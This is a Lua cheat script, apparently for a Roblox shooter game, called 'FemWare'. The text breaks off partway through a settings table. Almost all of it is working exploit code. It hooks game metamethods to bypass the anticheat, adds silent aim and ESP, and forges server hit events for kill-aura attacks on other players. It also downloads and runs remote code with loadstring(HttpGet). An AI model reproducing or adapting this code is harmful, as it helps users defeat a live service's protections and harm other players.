if not _G.DoubleMan then
    _G.DoubleMan = "1 burger"
else
    game.Players.LocalPlayer:Kick("What did I tell you about executing twice little boy?")
    return
end

-- hey

    function GunModules() -- [[FemWare]]
        for i, v in pairs(getgc(true)) do
            if type(v) == 'table' and rawget(v, 'EquipTime') then
                if Settings.GunMods.NoRecoil == true then
                    coroutine.resume(coroutine.create(function()
                        v.Recoil = 0
                        v.CameraRecoilingEnabled = false
                        v.AngleX_Min = 0
                        v.AngleX_Max = 0
                        v.AngleY_Min = 0
                        v.AngleY_Max = 0
                        v.AngleZ_Min = 0
                        v.AngleZ_Max = 0
                    end))
                end
                if Settings.GunMods.Spread == true then
                    coroutine.resume(coroutine.create(function()
                        v.Spread = Settings.GunMods.SpreadAmount
                    end))
                end
                if Settings.GunMods.InstantEquip == true then
                    coroutine.resume(coroutine.create(function()
                        v.EquipTime = 0
                        v.EquipAnimSpeed = 25
                    end))
                end
                if Settings.GunMods.InstantAim == true then
                    coroutine.resume(coroutine.create(function()
                        v.AimSettings.AimSpeed = 0
                    end))
                    coroutine.resume(coroutine.create(function()
                        v.SniperSettings.AimSpeed = 0
                        v.SniperSettings.AimAnimSpeed = 25
                    end))
                end
                if Settings.GunMods.BurstEnabled == true then
                    coroutine.resume(coroutine.create(function()
                        v.FireModeSettings = {
                            FireMode = "Semi",
                            BurstAmount = Settings.GunMods.BurstAmount,
                            BurstRate = Settings.GunMods.BurstRate,
                            CanSwitch = true,
                            SwitchTo = "Burst"
                        }
                    end))
                end
            end
        end
    end

    function GetClosestHumanoidRootPart(Magnitude)
        local Closest = nil
        for i, v in pairs(game:GetService("Players"):GetPlayers()) do
            if v ~= game:GetService("Players").LocalPlayer and v.Character ~= nil and v.Character.Humanoid.Health ~= 0 and (game:GetService("Players").LocalPlayer.Character.HumanoidRootPart.Position - v.Character.HumanoidRootPart.Position).Magnitude < Magnitude then
                Magnitude = (game:GetService("Players").LocalPlayer.Character.HumanoidRootPart.Position - v.Character.HumanoidRootPart.Position).Magnitude
                Closest = v.Character.HumanoidRootPart
            end
        end
        return Closest
    end

    function HitAugs(plr)
        local Value = game:GetService("ReplicatedStorage").Events["XMHH.1"]:InvokeServer("\240\159\154\168", tick(), game:GetService("Players").LocalPlayer.Character:FindFirstChildOfClass("Tool"), "DZDRRRKI", plr.Parent, "Register")
        game:GetService("ReplicatedStorage").Events["XMHH2.1"]:FireServer("\240\159\154\168", tick(), game:GetService("Players").LocalPlayer.Character:FindFirstChildOfClass("Tool"), "2389ZFX33", Value, false, game:GetService("Players").LocalPlayer.Character["Right Arm"], plr, plr.Parent, plr.Position, plr.Position)
    end

    function HitAugs2(plr)
        local Value = game:GetService("ReplicatedStorage").Events["XMHH.1"]:InvokeServer("\240\159\154\168", tick(), game:GetService("Players").LocalPlayer.Character:FindFirstChildOfClass("Tool"), "DZDRRRKI", plr.Parent, "Register")
        game:GetService("ReplicatedStorage").Events["XMHH2.1"]:FireServer("\240\159\154\168", tick(), game:GetService("Players").LocalPlayer.Character:FindFirstChildOfClass("Tool"), "2389ZFX33", Value, false, game:GetService("Players").LocalPlayer.Character["Right Arm"], plr, plr.Parent, plr.Position, plr.Position)
        
    end

    function SendIT(msg, dur)
        local l__ReplicatedStorage__1 = game:GetService("ReplicatedStorage");
        l__ReplicatedStorage__1.Events2.Notification:Fire({
            Title = Version,
            Text = tostring(msg),
            Duration = dur
        }, "lost");
    end

    function BypassAnticheat() -- By github
        local function CheckTable(tbl, ...)
            local Indexes = {...}
        
            for _, v in ipairs(Indexes) do
                if not (rawget(tbl, v)) then
                    return false
                end
            end
        
            return true
        end
        
        local u21
        for _,v in ipairs(getgc(true)) do
            if (typeof(v) == "table" and CheckTable(v, "A", "B", "GP", "EN")) then
                u21 = v
                break
            end
        end
        
        hookfunction(u21.A, function()        
        end)

        hookfunction(u21.B, function()                    
        end)
    end
    
    function chat(text)
        local StarterGui = game:GetService('StarterGui')
        local A = false
        local ChatBar = game:GetService('Players').LocalPlayer:WaitForChild('PlayerGui'):WaitForChild('Chat'):WaitForChild('Frame'):WaitForChild('ChatBarParentFrame'):WaitForChild('Frame'):WaitForChild('BoxFrame'):WaitForChild('Frame'):FindFirstChildOfClass('TextBox')
        A = StarterGui:GetCore('ChatActive')
        StarterGui:SetCore('ChatActive', true)
        ChatBar:CaptureFocus()
        ChatBar.Text = text
        ChatBar.TextEditable = false
        task.wait()
        ChatBar:ReleaseFocus(true)
        ChatBar.TextEditable = true
        task.wait()
        StarterGui:SetCore('ChatActive', A)
    end

    function GetDealer()
        local Studs = 7
        local Part;

        for _, v in ipairs(game:GetService("Workspace").Map.Shopz:GetChildren()) do
            if v:FindFirstChild("MainPart") then
                local Distance = (game:GetService("Players").LocalPlayer.Character.HumanoidRootPart.Position - v:FindFirstChild("MainPart").Position).Magnitude
                if Distance < Studs then
                    Studs = Distance
                    Part = v:FindFirstChild("MainPart")
                end
            end
        end

        return Part
    end

    function GetPositionOnScreen(Vector)
        local Vec3, OnScreen = WorldToScreen(Cam, Vector)
        return Vector2.new(Vec3.X, Vec3.Y), OnScreen
    end

    function ValidateArguments(Args, RayMethod)
        local Matches = 0
        if #Args < RayMethod.ArgCountRequired then
            return false
        end
        for Pos, Argument in next, Args do
            if typeof(Argument) == RayMethod.Args[Pos] then
                Matches = Matches + 1
            end
        end
        return Matches >= RayMethod.ArgCountRequired
    end

    function GetDirection(Origin, Position)
        return (Position - Origin).Unit * 1000
    end

    function GetMousePosition()
        return Vector2.new(Mouse.X, Mouse.Y)
    end

    local function IsPlayerVisible(TargetPlayer)
        local PlayerCharacter = TargetPlayer.Character
        local LocalPlayerCharacter = Player.Character
        
        if not (PlayerCharacter or LocalPlayerCharacter) then return end 
        
        local PlayerRoot = game.FindFirstChild(PlayerCharacter, SilentSettings.Main.TargetPart) or game.FindFirstChild(PlayerCharacter, "HumanoidRootPart")
        
        if not PlayerRoot then return end 
        
        local CastPoints, IgnoreList = {PlayerRoot.Position, LocalPlayerCharacter, PlayerCharacter}, {LocalPlayerCharacter, PlayerCharacter}
        local ObscuringObjects = #GetPartsObscuringTarget(Cam, CastPoints, IgnoreList)
        
        return ((ObscuringObjects == 0 and true) or (ObscuringObjects > 0 and false))
    end

    function GetClosestPlayer()
        local Closest
        local DistanceToMouse
        for _, v in next, game.GetChildren(Players) do
            if SilentSettings.Main.Whitelist and v:IsFriendsWith(game.Players.LocalPlayer.UserId) then continue end
            if v == Player then continue end

            local Character = v.Character
            if not Character then continue end

            --if SilentSettings.Main.VisibleCheck and not IsPlayerVisible(v) then continue end

            local HumanoidRootPart = game.FindFirstChild(Character, "HumanoidRootPart")
            local Humanoid = game.FindFirstChild(Character, "Humanoid")

            if not HumanoidRootPart or not Humanoid or Humanoid and Humanoid.Health <= 0 then continue end

            local ScreenPosition, OnScreen = GetPositionOnScreen(HumanoidRootPart.Position)

            if not OnScreen then continue end

            local Distance = (GetMousePosition() - ScreenPosition).Magnitude
            if Distance <= (DistanceToMouse or (SilentSettings.FOVSettings.Radius) or 2000) then
                Closest = ((SilentSettings.Main.TargetPart == "Random" and Character[ValidTargetParts[math.random(1, #ValidTargetParts)]]) or Character[SilentSettings.Main.TargetPart])
                DistanceToMouse = Distance
            end
        end
        return Closest
    end

    function ScrapESP(Scrap)
        local ItemName = Drawing.new("Text")
        ItemName.Visible = false
        ItemName.Center = true
        ItemName.Outline = true
        ItemName.Font = 2
        ItemName.Size = 13
        ItemName.Color = Color3.new(1, 2.5, 2.5)
        ItemName.Text = "Scrap"

        local RarityText = Drawing.new("Text")
        RarityText.Visible = false
        RarityText.Center = true
        RarityText.Outline = true
        RarityText.Font = 2
        RarityText.Size = 13
        RarityText.Color = Color3.new(1, 2.5, 2.5)
        RarityText.Text = "Type"

        local DistanceText = Drawing.new("Text")
        DistanceText.Visible = false
        DistanceText.Center = true
        DistanceText.Outline = true
        DistanceText.Font = 2
        DistanceText.Size = 13
        DistanceText.Color = Color3.new(1, 2.5, 2.5)
        DistanceText.Text = "Distance"

        local function InfoUpdate()
            local Iu

            Iu = game:GetService("RunService").RenderStepped:Connect(function()
                if not workspace:IsAncestorOf(Scrap) then
                    ItemName.Visible = false
                    RarityText.Visible = false
                    DistanceText.Visible = false

                    Iu:Disconnect()
                else
                    local Vector, OnScreen = Cam:WorldToViewportPoint(Scrap:FindFirstChild("MeshPart").Position)

                    if OnScreen then
                        ItemName.Position = Vector2.new(Vector.X, Vector.Y - 30)
                        RarityText.Position = Vector2.new(Vector.X, Vector.Y - 20)
                        DistanceText.Position = Vector2.new(Vector.X, Vector.Y - 10)

                        ItemName.Visible = false
                        RarityText.Visible = false
                        DistanceText.Visible = false

                        local ItemDistance = math.ceil((Scrap.MeshPart.Position - game.Players.LocalPlayer.Character:WaitForChild("HumanoidRootPart").Position).magnitude)

                        if ESPSettings.ScrapESP.Enabled == true then
                            if ItemDistance < ESPSettings.ScrapESP.Distance then
                                if tostring(Scrap:FindFirstChild("MeshPart"):FindFirstChild("Particle").Color) == "0 1 1 1 0 1 1 1 1 0 " then
                                    RarityText.Text = "Rarity: Bad"
                                    RarityText.Color = Color3.new(1, 2.5, 2.5)

                                    if ESPSettings.ScrapESP.BadOnly == true then
                                        ItemName.Visible = true
                                        RarityText.Visible = true
                                        DistanceText.Visible = true
                                    else
                                        ItemName.Visible = false
                                        RarityText.Visible = false
                                        DistanceText.Visible = false
                                    end
                                elseif tostring(Scrap:FindFirstChild("MeshPart"):FindFirstChild("Particle").Color) == "0 0.184314 1 0.4 0 1 0.184314 1 0.4 0 " then
                                    RarityText.Text = "Rarity: Good"
                                    RarityText.Color = Color3.new(0, 2.5, 0)

                                    if ESPSettings.ScrapESP.GoodOnly == true then
                                        ItemName.Visible = true
                                        RarityText.Visible = true
                                        DistanceText.Visible = true
                                    else
                                        ItemName.Visible = false
                                        RarityText.Visible = false
                                        DistanceText.Visible = false
                                    end
                                elseif tostring(Scrap:FindFirstChild("MeshPart"):FindFirstChild("Particle").Color) == "0 1 0.184314 0.184314 0 1 1 0.184314 0.184314 0 " then
                                    RarityText.Text = "Rarity: Rare"
                                    RarityText.Color = Color3.new(1, 0, 0)

                                    if ESPSettings.ScrapESP.RareOnly == true then
                                        ItemName.Visible = true
                                        RarityText.Visible = true
                                        DistanceText.Visible = true
                                    else
                                        ItemName.Visible = false
                                        RarityText.Visible = false
                                        DistanceText.Visible = false
                                    end
                                else
                                    RarityText.Text = "Rarity: Legnedary"
                                    RarityText.Color = Color3.new(1, 1, 0.5)

                                    if ESPSettings.ScrapESP.LegendaryOnly == true then
                                        ItemName.Visible = true
                                        RarityText.Visible = true
                                        DistanceText.Visible = true
                                    else
                                        ItemName.Visible = false
                                        RarityText.Visible = false
                                        DistanceText.Visible = false
                                    end
                                end

                                DistanceText.Text = "[" .. tostring(ItemDistance) .. "]"
                            else
                                ItemName.Visible = false
                                RarityText.Visible = false
                                DistanceText.Visible = false
                            end
                        else
                            ItemName.Visible = false
                            RarityText.Visible = false
                            DistanceText.Visible = false

                            Iu:Disconnect()
                        end
                    else
                        ItemName.Visible = false
                        RarityText.Visible = false
                        DistanceText.Visible = false
                    end
                end
            end)
        end

        coroutine.wrap(InfoUpdate)()
    end

    function SafeESP(Vault, RarityValue)
        local ItemName = Drawing.new("Text")
        ItemName.Visible = false
        ItemName.Center = true
        ItemName.Outline = true
        ItemName.Font = 2
        ItemName.Size = 13
        ItemName.Color = Color3.new(1, 2.5, 2.5)
        ItemName.Text = "Safe"

        local RarityText = Drawing.new("Text")
        RarityText.Visible = false
        RarityText.Center = true
        RarityText.Outline = true
        RarityText.Font = 2
        RarityText.Size = 13
        RarityText.Color = Color3.new(1, 2.5, 2.5)
        RarityText.Text = "Type"

        -- local StatusText = Drawing.new("Text")
        -- StatusText.Visible = false
        -- StatusText.Center = true
        -- StatusText.Outline = true
        -- StatusText.Font = 2
        -- StatusText.Size = 13
        -- StatusText.Color = Color3.new(1, 2.5, 2.5)
        -- StatusText.Text = "Status"

        local DistanceText = Drawing.new("Text")
        DistanceText.Visible = false
        DistanceText.Center = true
        DistanceText.Outline = true
        DistanceText.Font = 2
        DistanceText.Size = 13
        DistanceText.Color = Color3.new(1, 2.5, 2.5)
        DistanceText.Text = "Distance"

        local function InfoUpdate()
            local Iu

            Iu = game:GetService("RunService").RenderStepped:Connect(function()
                if not workspace:IsAncestorOf(Vault) then
                    ItemName.Visible = false
                    RarityText.Visible = false
                    -- StatusText.Visible = false
                    DistanceText.Visible = false

                    Iu:Disconnect()
                else
                    local Vector, OnScreen = Cam:WorldToViewportPoint(Vault:FindFirstChild("MainPart").Position)

                    if OnScreen then
                        ItemName.Position = Vector2.new(Vector.X, Vector.Y - 30)
                        RarityText.Position = Vector2.new(Vector.X, Vector.Y - 20)
                        -- StatusText.Position = Vector2.new(Vector.X, Vector.Y - 20)
                        DistanceText.Position = Vector2.new(Vector.X, Vector.Y - 10)

                        ItemName.Visible = false
                        RarityText.Visible = false
                        -- StatusText.Visible = false
                        DistanceText.Visible = false

                        local ItemDistance = math.ceil((Vault:FindFirstChild("MainPart").Position - game.Players.LocalPlayer.Character:WaitForChild("HumanoidRootPart").Position).magnitude)

                        if ESPSettings.SafeESP.Enabled == true then
                            if ItemDistance < ESPSettings.SafeESP.Distance then
                                if RarityValue == 2 then
                                    RarityText.Text = "Rarity: Good"
                                    RarityText.Color = Color3.new(0, 2.5, 0)

                                    if ESPSettings.SafeESP.SmallOnly == true then
                                        ItemName.Visible = true
                                        RarityText.Visible = true
                                        -- StatusText.Visible = true
                                        DistanceText.Visible = true
                                    else
                                        ItemName.Visible = false
                                        RarityText.Visible = false
                                        -- StatusText.Visible = false
                                        DistanceText.Visible = false
                                    end
                                elseif RarityValue == 3 then
                                    RarityText.Text = "Rarity: Rare"
                                    RarityText.Color = Color3.new(1, 0, 0)

                                    if ESPSettings.SafeESP.BigOnly == true then
                                        ItemName.Visible = true
                                        RarityText.Visible = true
                                        -- StatusText.Visible = true
                                        DistanceText.Visible = true
                                    else
                                        ItemName.Visible = false
                                        RarityText.Visible = false
                                        -- StatusText.Visible = false
                                        DistanceText.Visible = false
                                    end
                                end

                                DistanceText.Text = "[" .. tostring(ItemDistance) .. "]"

                                if Vault.Values.Broken.Value == false then
                                    -- StatusText.Text = "NOT BROKEN"

                                    ItemName.Visible = true
                                    RarityText.Visible = true
                                    -- StatusText.Visible = true
                                    DistanceText.Visible = true

                                else
                                    -- StatusText.Text = "BROKEN"

                                    ItemName.Visible = false
                                    RarityText.Visible = false
                                    -- StatusText.Visible = false
                                    DistanceText.Visible = false

                                end
                            else
                                ItemName.Visible = false
                                RarityText.Visible = false
                                -- StatusText.Visible = false
                                DistanceText.Visible = false
                            end
                        else
                            ItemName.Visible = false
                            RarityText.Visible = false
                            -- StatusText.Visible = false
                            DistanceText.Visible = false

                            Iu:Disconnect()
                        end
                    else
                        ItemName.Visible = false
                        RarityText.Visible = false
                        -- StatusText.Visible = false
                        DistanceText.Visible = false
                    end
                end
            end)
        end

        coroutine.wrap(InfoUpdate)()
    end

    function RegisterESP(Register)
        local ItemName = Drawing.new("Text")
        ItemName.Visible = false
        ItemName.Center = true
        ItemName.Outline = true
        ItemName.Font = 2
        ItemName.Size = 13
        ItemName.Color = Color3.new(1, 2.5, 2.5)
        ItemName.Text = "Register"

        -- local StatusText = Drawing.new("Text")
        -- StatusText.Visible = false
        -- StatusText.Center = true
        -- StatusText.Outline = true
        -- StatusText.Font = 2
        -- StatusText.Size = 13
        -- StatusText.Color = Color3.new(1, 2.5, 2.5)
        -- StatusText.Text = "Status"

        local DistanceText = Drawing.new("Text")
        DistanceText.Visible = false
        DistanceText.Center = true
        DistanceText.Outline = true
        DistanceText.Font = 2
        DistanceText.Size = 13
        DistanceText.Color = Color3.new(1, 2.5, 2.5)
        DistanceText.Text = "Distance"

        local function InfoUpdate()
            local Iu

            Iu = game:GetService("RunService").RenderStepped:Connect(function()
                if not workspace:IsAncestorOf(Register) then
                    ItemName.Visible = false
                    -- StatusText.Visible = false
                    DistanceText.Visible = false

                    Iu:Disconnect()
                else
                    local Vector, OnScreen = Cam:WorldToViewportPoint(Register:FindFirstChild("MainPart").Position)

                    if OnScreen then
                        ItemName.Position = Vector2.new(Vector.X, Vector.Y - 20)
                        -- StatusText.Position = Vector2.new(Vector.X, Vector.Y - 20)
                        DistanceText.Position = Vector2.new(Vector.X, Vector.Y - 10)

                        ItemName.Visible = false
                        -- StatusText.Visible = false
                        DistanceText.Visible = false

                        local ItemDistance = math.ceil((Register:FindFirstChild("MainPart").Position - game.Players.LocalPlayer.Character:WaitForChild("HumanoidRootPart").Position).magnitude)

                        if ESPSettings.RegisterESP.Enabled == true then
                            if ItemDistance < ESPSettings.RegisterESP.Distance then
                                --ItemName.Visible = true
                                -- StatusText.Visible = true
                                -- DistanceText.Visible = true

                                DistanceText.Text = "[" .. tostring(ItemDistance) .. "]"

                                if Register.Values.Broken.Value == false then
                                    -- StatusText.Text = "NOT BROKEN"

                                    ItemName.Visible = true
                                    -- StatusText.Visible = true
                                    DistanceText.Visible = true

                                else
                                    -- StatusText.Text = "BROKEN"

                                    ItemName.Visible = false
                                    -- StatusText.Visible = false
                                    DistanceText.Visible = false

                                end
                            else
                                ItemName.Visible = false
                                -- StatusText.Visible = false
                                DistanceText.Visible = false
                            end
                        else
                            ItemName.Visible = false
                            -- StatusText.Visible = false
                            DistanceText.Visible = false

                            Iu:Disconnect()
                        end
                    else
                        ItemName.Visible = false
                        -- StatusText.Visible = false
                        DistanceText.Visible = false
                    end
                end
            end)
        end

        coroutine.wrap(InfoUpdate)()
    end

    function EzChatBypass()
        local meta, old = getrawmetatable(game), {};
        for i, v in next, meta do old[i] = v end;
        
        local char = '˞';
        
        setreadonly(meta, false);
        
        meta.__namecall = newcclosure(function(...)
            local method = getnamecallmethod();
            local args = {...};
        
            if method == 'FireServer' and args[1].Name == 'SayMessageRequest' and Settings.EZBypass then
                args[2] = string.gsub(args[2], 'ez', function(c)
                    return char .. c;
                end);
                args[2] = string.gsub(args[2], 'Ez', function(c)
                    return char .. c;
                end);
                args[2] = string.gsub(args[2], 'eZ', function(c)
                    return char .. c;
                end);
                args[2] = string.gsub(args[2], 'EZ', function(c)
                    return char .. c;
                end);
        
                return old.__namecall(unpack(args));
            end;
        
            return old.__namecall(...);
        end);
        
        setreadonly(meta, true);
    end

    function CalculateChance(Percentage)
        Percentage = math.floor(Percentage)
        local chance = math.floor(Random.new().NextNumber(Random.new(), 0, 1) * 100) / 100
        return chance <= Percentage / 100
    end

    function SilentAim()
        local oldNamecall
		oldNamecall = hookmetamethod(game, "__namecall", function(...)
			local Method = getnamecallmethod()
			local Arguments = {...}
			local self = Arguments[1]
            local chance = CalculateChance(Settings.HitChance.Percentage)
			if SilentSettings.Main.Enabled and self == workspace and not checkcaller() and chance == true then
				if Method == "Raycast" then
					if ValidateArguments(Arguments, ExpectedArguments.Raycast) then
						local A_Origin = Arguments[2]

						local HitPart = GetClosestPlayer()
						if HitPart then
							Arguments[3] = GetDirection(A_Origin, HitPart.Position)

							return oldNamecall(unpack(Arguments))
						end
					end
				end
			end
			return oldNamecall(...)
		end)
    end

    function InfiniteStamina()
        local StaminaTake = getrenv()._G.S_Take
        local StaminaFunc = getupvalue(StaminaTake, 2) 
        
        for i, v in pairs(getupvalues(StaminaFunc)) do
            if type(v) == "function" and getinfo(v).name == "Upt_S" then
                local OldFunction; 
        
                OldFunction = hookfunction(v, function(...)
                    if Settings.InfiniteStamina == true then
                        local CharacterVar = game:GetService("Players").LocalPlayer.Character
        
                        if not CharacterVar or not CharacterVar.Parent then
                            local CharacterVar = game:GetService("Players").LocalPlayer.CharacterAdded:wait()
        
                            getupvalue(StaminaFunc, 6).S = 100
                        elseif CharacterVar then
                            getupvalue(StaminaFunc, 6).S = 100
                        end
                    end
        
                    return OldFunction(...)
                end)
            end
        end
    end

    function NoJumpCooldown()
        local __newindex
        __newindex = hookmetamethod(game, "__newindex", function(t, k, v)
            if (t:IsDescendantOf(Character) and k == "Jump" and v == false) then
                if Settings.NoJumpCooldown == true then
                    return
                end
            end

            return __newindex(t, k, v)
        end)
    end

    function AllAnitCheats() -- By not me aha
        -- local oldStamina
		-- oldStamina =
		-- 	hookfunction(
		-- 		getupvalue(getrenv()._G.S_Take, 2),
		-- 		function(v1, ...)
		-- 			if (Settings.InfiniteStamina) then
		-- 			v1 = 0
		-- 		end
		-- 			return oldStamina(v1, ...)
		-- 		end
		-- 	)

        local MT = getrawmetatable(game)
            setreadonly(MT, false)
            local NameCall = MT.__namecall
            
            MT.__namecall = newcclosure(function(self, ...)
                local Method = getnamecallmethod()
                local Args = {...}
            
                if Method == "FireServer" and Args[1] == "BHHh" then
                    if Settings.NoBarbwire == true then
                        return wait(9e9)
                    end
                elseif Method == "FireServer" and Args[1] == "FlllD" or Args[1] == "FlllH" then
                    if Settings.NoFallDamage == true then
                        return wait(9e9)
                    end
                elseif Method == "FireServer" and Args[1] == "__--r" or Args[1] == "HITRGP" or Args[1] == "FllH" then
                    if Settings.NoRagdoll == true then
                        return wait(9e9)
                    end
                elseif Method == "FireServer" and Args[2] == "Drown" then
                    if Settings.NoDrown == true then
                        return wait(9e9)
                    end
                end
            
                return NameCall(self, ...)
            end)

    end

    function VisibleHit(Target, Debounce, Debounce2) -- By Master Tupi
        local Client = game.Players.LocalPlayer; local Clients = game.Players
        local ReplicatedStorage = game:GetService("ReplicatedStorage")

        local return_teleport = Client.Character.HumanoidRootPart.CFrame
        local return_value
        local time = tick();
        
        local DebounceArgs = {}

        DebounceArgs[1] = "\240\159\154\168"
        DebounceArgs[2] = time
        DebounceArgs[3] = Client.Character:FindFirstChildOfClass("Tool")
        DebounceArgs[4] = "43TRFWJ"
        DebounceArgs[5] = "Normal"
        DebounceArgs[6] = time - 0
        DebounceArgs[7] = true

        return_value = ReplicatedStorage.Events["XMHH.1"]:InvokeServer(unpack(DebounceArgs))

        wait(Debounce)

        local pp = false

        coroutine.resume(coroutine.create(function()
            local render = game:GetService("RunService").RenderStepped:Connect(function()
                if pp == false then
                    Client.Character.HumanoidRootPart.CFrame = Target["HumanoidRootPart"].CFrame + Vector3.new(0,3,0)
                elseif render then
                    render:Disconnect()
                end
            end)
        end))
            Client.Character.HumanoidRootPart.CFrame = Target["HumanoidRootPart"].CFrame + Vector3.new(0,3,0)

            wait(Debounce2)

            pp = true
            for _, v in next, Clients:GetChildren() do if v ~= Client and v.Character then if v.Character:FindFirstChildOfClass("Humanoid") then
                if (Client.Character.HumanoidRootPart.Position - v.Character.HumanoidRootPart.Position).magnitude < 20 then

                local HitArgs = {}

                HitArgs[1] = "\240\159\154\168"
                HitArgs[2] = time
                HitArgs[3] = Player.Character:FindFirstChildOfClass("Tool")
                HitArgs[4] = "2389ZFX33"
                HitArgs[5] = return_value
                HitArgs[6] = false
                HitArgs[7] = Player.Character["Right Arm"]
                HitArgs[8] = v.Character["Head"]
                HitArgs[9] = v.Character
                HitArgs[10] = Player.Character["Right Arm"].Position
                HitArgs[11] = v.Character["Head"].Position
                ReplicatedStorage.Events["XMHH2.1"]:FireServer(unpack(HitArgs)) ReplicatedStorage.Events["XMHH2.1"]:FireServer(unpack(HitArgs)) 
                ReplicatedStorage.Events["XMHH2.1"]:FireServer(unpack(HitArgs)) ReplicatedStorage.Events["XMHH2.1"]:FireServer(unpack(HitArgs))

                end
            end
            end
            end
                Client.Character.HumanoidRootPart.CFrame = return_teleport
            end

    function TeleportAreaNew(Cframe)

        local TPCFrame = Cframe
        local User = game.Players.LocalPlayer.Character.HumanoidRootPart

        User.CFrame = TPCFrame
    end

    function PartThin(p)
        p.Anchored = true
        p.Size = Vector3.new(2, 10, 2)
        p.Material = Enum.Material.ForceField
        p.Color = Color3.fromRGB(255, 255, 255)
        p.CanCollide = false
        p.Transparency = 1
    end

    function KAura(x)
        local v = game:GetService("ReplicatedStorage").Events["XMHH.1"]:InvokeServer("\240\159\154\168", tick(), game:GetService("Players").LocalPlayer.Character:FindFirstChildOfClass("Tool"), "43TRFWJ", "Normal", tick(), true)
        wait(GetDebounce2(x))
        game:GetService("ReplicatedStorage").Events["XMHH2.1"]:FireServer("\240\159\154\168", tick(), game:GetService("Players").LocalPlayer.Character:FindFirstChildOfClass("Tool"), "2389ZFX33", v, false, game:GetService("Players").LocalPlayer.Character["Right Arm"], (x.Parent["Head"]), x.Parent, game:GetService("Players").LocalPlayer.Character["Right Arm"].Position, (x.Parent["Head"]).Position) 
    end

    function FAura(x)
        local v = game:GetService("ReplicatedStorage").Events["XMHH.1"]:InvokeServer("\240\159\154\168", tick(), game:GetService("Players").LocalPlayer.Character:FindFirstChildOfClass("Tool"), "EXECQQ")
        wait(0.5)
        game:GetService("ReplicatedStorage").Events["XMHH2.1"]:FireServer("\240\159\154\168", tick(), game:GetService("Players").LocalPlayer.Character:FindFirstChildOfClass("Tool"), "2389ZFX33", v, false, game:GetService("Players").LocalPlayer.Character["Right Leg"], (x.Parent["Head"]), x.Parent, game:GetService("Players").LocalPlayer.Character["Right Leg"].Position, (x.Parent["Head"]).Position)
    end

    function Get(String)
        local Found
        local strl = String:lower()

            for i,v in next, game.Players:GetChildren() do
                if v.Name:lower():sub(1, #String) == String:lower() or v.DisplayName:lower():sub(1, #String) == String:lower() then
                    Found = v.Character
                end
            end

        return Found  
    end

    function GenerateHuman(String)
        local Found
        local strl = String:lower()

            for i,v in next, game.Players:GetChildren() do
                if v.Name:lower():sub(1, #String) == strl or v.DisplayName:lower():sub(1, #String) == strl then
                    Found = v
                end
            end

        return Found  
    end

    function GetDebounce2(Target)
        local hrp = Target
        local hrp2 = Player.Character.HumanoidRootPart
        local debounce = 0.1
        
        local mag = (hrp.Position - hrp2.Position).magnitude
        
        if mag/5275 < 0.2 then
            debounce = mag/5275 + 0.85 + mag/tick()
    
        else
    
            debounce = 0.2 - mag/52750
        end
    
        return debounce
    end

--

local Success, Error = pcall(function()

Version = "FemWare 0.69Hi"
game:GetService("StarterGui"):SetCore("SendNotification", {
  Title = Version,
  Text = "Thanks for choosing FemWare! Script will only initiate once playing, not in lobby. discord.gg/femware",
  Icon = "rbxassetid://9327507243",
  Duration = 15
})
repeat
  wait(0.5)
until game:IsLoaded() and not nil and not nil
loadstring(game:HttpGet("https://raw.githubusercontent.com/JackHiggly/FemWare/main/Verify", true))()
loadstring(game:HttpGet("https://raw.githubusercontent.com/JackHiggly/FemWare/main/Con1", true))()
if l ~= Version or l == nil then
  game.Players.LocalPlayer:Kick("FemWare is under maintenance: discord.gg/femware")
  return
end
game = game
GetService = game.GetService
Workspace = GetService(game, "Workspace")
Players = GetService(game, "Players")
ReplicatedStorage = GetService(game, "ReplicatedStorage")
StarterGui = GetService(game, "StarterGui")
LogService = GetService(game, "LogService")
HttpService = GetService(game, "HttpService")
ScriptContext = GetService(game, "ScriptContext")
Settings = {
  GunMods = {
    NoRecoil = false,
    InstantEquip = false,
    Spread = false,
    InstantAim = false,
    AutoMode = false,
    SpreadAmount = 0,
    BurstRate = 1,
    BurstEnabled = false,
    BurstAmount = 1
  },
  DownedChat = false,
  KillChat = false,
  DownedMSG = "IM A FEMALE",
  KillMSG = "",
  IsDead = true,
  AutoPickCash = false,
  AutoPickTools = false,
  AutoPickScrap = false,
  AutoResupplyAmmo = false,
  InfiniteStamina = false,
  NoJumpCooldown = false,
  SpaceJump = false,
  NoFailLockpick = false,
  ShowChatLogs = false,
  NoFlashbang = false,
  NoSmoke = false,
  UnlockDoorsNearby = false,
  OpenDoorsNearby = false,
  NoClip = false,
  FullBright = false,
  CamFovToggled = false,
  CamFov = 70,
  Zoom = 10,
  InfinitePepperSpray = false,
  PepperSprayAura = false,
  WalkSpeed = {Enabled = false, Amount = 16},
  JumpPower = {Enabled = false, Amount = 40},
  NoBarbwire = false,
  NoFallDamage = false,
  NoRagdoll = false,
  WatermarkOn = false,
  ViewModel = {
    Enabled = false,
    Viewmodel = {
      Color = Color3.fromRGB(255, 255, 255),
      Material = Enum.Material.ForceField
    },
    Melees = {
      Color = Color3.fromRGB(255, 255, 255),
      Material = Enum.Material.ForceField
    },
    Guns = {
      Color = Color3.fromRGB(255, 255, 255),
      Material = Enum.Material.Plastic
    },
    LeftArmOff = false
  },
  CustomHitSound = 5043539486,
  VolumeHitsound = 1,
  WallBang = false,
  ElevatorTP = false,
  NoDrown = false,
  TowerTP = false,
  HitBox = {Enabled = false, Size = 1.5},
  TPWalking = {Enabled = false, Speed = 0.5},
  HeadOnly = false,
  EZBypass = false,
  KillAura = false,
  FinishAura = false,
  AutoRespawn = false,
  KillSay = false,
  AutoAllowanceClaim = false,
  RemoveHelmetGUI = false,
  StaffDetector = {Enabled = true, Type = "Notify"},
  Spin = {Enabled = false, Speed = 10},
  NoDown = false,
  HitChance = {Enabled = false, Percentage = 100},
  Aimbot = {Whitelist = false},
  UIKey = Enum.KeyCode.LeftAlt
}
ESPSettings = {
  PlayerESP = {
    Enabled = false,
    TracersOn = false,
    BoxesOn = false,
    NamesOn = true,
    DistanceOn = false,
    HealthOn = false,
    ToolOn = false,
    FaceCamOn = false,
    Distance = 2000
  },
  ScrapESP = {
    Enabled = false,
    Distance = 2000,
    LegendaryOnly = true,
    RareOnly = true,
    GoodOnly = true,
    BadOnly = true
  },
  SafeESP = {
    Enabled = false,
    Distance = 2000,
    BigOnly = true,
    SmallOnly = true
  },
  RegisterESP = {Enabled = false, Distance = 2000},
  ESPColor = Color3.fromRGB(255, 255, 255),
  ToolColor = Color3.fromRGB(255, 255, 255)
}
CoolDowns = {
  AutoPickUps = {
    MoneyCooldown = false,
    ScrapCooldown = false,
    ToolCooldown = false
  },
  ResupplyCD = false
}
SilentSettings = {
  Main = {
